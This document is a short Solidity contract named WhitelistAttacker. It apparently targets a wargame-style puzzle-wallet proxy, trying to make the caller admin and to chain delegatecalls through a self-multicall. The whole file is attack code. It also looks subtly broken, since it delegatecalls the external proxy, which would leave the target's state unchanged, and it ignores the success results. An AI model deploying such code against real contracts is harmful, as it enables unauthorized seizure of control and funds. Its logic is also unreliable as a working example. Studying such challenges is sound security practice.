pragma solidity ^0.8.0;

contract WhitelistAttacker {
    function proposeAdmin(address puzzleProxy) public {
        (bool success,) = puzzleProxy.delegatecall(abi.encodeWithSignature("proposeNewAdmin(address)", msg.sender));
    }

    function approveAdmin(address puzzleProxy) public {
        (bool success,) = puzzleProxy.delegatecall(abi.encodeWithSignature("approveNewAdmin(address)", msg.sender));
    }

    function multicall(bytes[] calldata data) external payable {
        for (uint i=0; i < data.length; i++) {
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error with delegatecall");
        }
    }

    fallback() external payable {
        // Empty fallback for receiving ETH
    }
}
